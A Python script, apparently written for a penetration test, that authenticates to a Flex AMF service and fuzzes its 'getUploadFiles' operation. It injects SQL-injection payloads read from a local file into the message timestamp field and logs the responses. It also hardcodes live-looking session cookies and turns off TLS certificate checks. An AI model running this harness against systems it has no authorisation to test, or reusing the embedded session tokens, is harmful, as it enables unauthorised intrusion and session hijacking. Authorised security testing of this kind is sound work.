import pyamf
from pyamf import remoting
from pyamf.flex import messaging
import uuid
import requests
from pyamf.remoting.client import RemotingService
import json
import time

payload = {'WE_USERNAME': <username>,
           'WE_PASSWORD': <password>,
           'WE_Version': "1.1.0.0",
           'AUTHTYPE': "PASSWORD"}

resp = requests.post(<url>,
                     data=payload,
                     verify=False
                     )
login_header = resp.headers['Set-Cookie'].split(',')
for iter in login_header:
    if "SMSESSION" in iter:
        iter = iter.split(";")
        session_id = iter[0].split("=")

# Use session_id[1] to get SMSESSION
cookies = {'SMSESSION': "reKmeIXnlfHQJaIfOUWfS8k34yd6q7g/BrwwecouhiAaYQNHydtL5+6Ctozl58PFjaBzd+NrPZTsdK1Mevmb+52zhu3/EH6UWDBSI1GfBmaDbsixfsmZ4+6AyPcRVzGtZr04ZtCrEQQw32H1jCdqxIt5hjfZ150GoLfceaciFo352nO0GnSF7afIv58/wslFBrTidKWgKlC90EydyrKMaRMpix6WBCQbIZKUDZOH45djbZHiy+YdRhE0g+dluSQI3T6EHXtWZJnvZS3C2F3V8mqRVAhs24ZZ5bLqO/ChvjVQ6b7WNlaQJPAwUjRFc0Pz8hd56pvp6umS3JB1CNEMoJhUS0LwJuan/IiyAQqY9TmkS1Nyrb17uqsl4hlnEP9eYh1fAqP4YEpEke1waXFmPMKgGmVGWUjaGnp3I3gW/VMWp9UStK9oWmApswWuon2TdMHSPZtJkMz5TYb2H6303Z8Nu4gUfemdYz+vNsm7+xcVDALxIlEoRaNjCZdU4+pS+SH2aA40lQcDWxO11vDvQq1j9l9CW2hcvQVTNp4GLVsrEjeKtid0AbBztEzA3Af5Q0y/crP/bLh5grvib58KWcA92Jr9NRg2fY8VP2ll+Kf/PV301KiHDjEMeVjn7cuShrN9h5Z6o2F3UtMd06cTyuBhiDtbLjCBadSjcztROX/cea0SqU7Xj6p2AeqkOjvA9Zx7MRAwZNK+1j0t2O/42C8txm7W11qzAOjJ0q8iqcn0hfOJiUHYt4hlyyUO8r1aFd4vbgmVSXdsoLyd/gkzGB1FTnnwMquwbdTRWBJ/zdghjKzAijR2FF9ifXfY5Hbho1Qsl6Wat1fbLhs06NKKj8xp0ESeBGlXXL5LoW0gTYO8GQhnr+pOD/lIuYrBwi/sp8ODXEHBCjEWxScthbnzE5qsBRk1wWOqSGx+/pigIfHEX4qt9AdrjNfhRt+i0v6N35lbRTJF/v0m7VJSXd26HxheZ0FqPLfgXOJTtHRUhK1qutCvWWpNSPc65XuQyjVPc2LZYZKiheZiauZJbsvpltZMRlgQjY3xfq6MSH3hJd3xmZmAz/cRkbTdDs4WyRZH+uUnBFExWr9azUX8KG2DtDjThnwrzhQEWnLbVvXvw+kv1oI5XNF0Vuuq+isgaJwxeJsUO2HlRMUROJaE9RGQS0a56/GZOk8XZNScEFkhps+KT3pdzliTKtWdn/cHBZ2B",
           'JSESSIONID': 'D76F44E88F8FCBE1272618A50E50C691', 'USERSESSIONSTATE': 'active', 'TS0115c575':'0159fffb66bee59c494ee49b49530f9efb41f5cce5c35faedc51925ea0949564c4eb578f09b167be65e33a81cb42a14597057cd5f9579f679f5dd7ddc396cc40814983e960eaf4c43249bf438dea98a58547c93769'}
count = 0
response = {}
file_path = r"C:\Thick Client\sqli.txt"
with open(file_path, "r") as fuzz_file:
    for entries in fuzz_file:
        msg = messaging.RemotingMessage(operation='getUploadFiles',
                                        clientId='6525D474-C40B-310E-5166-1BBAD11DB51D',
                                        destination='scheduleUploadDocCommand',
                                        messageId=str(uuid.uuid4()).upper(),
                                        body=['IRMEHT2'],
                                        headers={'DSId': '62A318D7-A719-932E-AAB7-19ED3B5CFA23',
                                                'DSEndpoint': 'my-amf', 'DSRequestTimeout': '150'},
                                        timeToLive= 0,
                                        timestamp=entries.strip())


        # msg_2 = messaging.RemotingMessage(operation='getReportDetails',
        #                           clientId='6525D474-C40B-310E-5166-1BBAD11DB51D',
        #                           destination='scheduleUploadDocCommand',
        #                           messageId=str(uuid.uuid4()).upper(),
        #                           body=['IRMEHT2'],
        #                           headers={'DSId': '62A318D7-A719-932E-AAB7-19ED3B5CFA23',
        #                                    'DSEndpoint': 'my-amf', 'DSRequestTimeout': '150'},
        #                           timeToLive=0,
        #                           timestamp=0)
        req = remoting.Request(target=None, body=[msg])#, msg_2])
        ev = remoting.Envelope(pyamf.AMF3)
        ev['/0'] = req
        # print("\n\n" + str(req))
        # Encode request
        bin_msg = remoting.encode(ev)

        # print("\n<-------------Encoded Request------------------>\n")
        # print(bin_msg.getvalue())

        # Fuzzing Logic
        # Send request; You can use other channels like RTMP
        time.sleep(1)
        resp = requests.post(<url>,
                            data=bin_msg.getvalue(),
                            headers={'Content-type': 'application/x-amf'},
                            cookies=cookies,
                            verify=False
                            )
        count += 1
        resp_msg = remoting.decode(resp.content)
        response[entries.strip()] = str(resp_msg.bodies[0][1])
print("No of Requests Sent: ", format(count))
print("File to be saved: ", format(r"C:\Thick Client\Responses\sqli_timestamp_getuploadfiles.txt"))
# print(response)
with open(r"C:\Thick Client\Responses\sqli_timestamp_getuploadfiles.txt", 'w') as fuzz_response:
    # json.dump(response, fuzz_response)
    fuzz_response.write(json.dumps(response))